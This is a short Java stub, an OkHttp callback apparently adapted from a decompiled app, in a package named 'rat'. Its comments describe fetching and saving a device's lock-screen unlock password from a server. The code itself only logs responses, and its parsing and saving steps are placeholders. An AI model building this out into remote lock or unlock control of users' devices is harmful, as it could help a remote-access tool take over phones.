package com.vendor.rat.network;

// ADAPT: vendor = com.guard.wallet.http.x (ServerLockCipherCallback)

import android.util.Log;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

/**
 * ServerLockCipherCallback - 服务端锁屏密码查询回调
 * vendor: 解析 ApiResult<ReqUnlockDeviceVO>，验证后保存解锁密码信息
 */
public final class x implements Callback {

    private static final String TAG = "ServerLockCipherCallback";

    @Override
    public void onFailure(Call call, IOException e) {
        Log.e(TAG, "request failed", e);
    }

    @Override
    public void onResponse(Call call, Response response) throws IOException {
        try {
            String body = response.body() != null ? response.body().string() : "";
            Log.d(TAG, "response: " + response.code());
            // ADAPT: vendor parses ApiResult<ReqUnlockDeviceVO>,
            // validates with h.t() then saves with h.K()
        } catch (Exception e) {
            Log.e(TAG, "parse error", e);
        } finally {
            response.close();
        }
    }
}
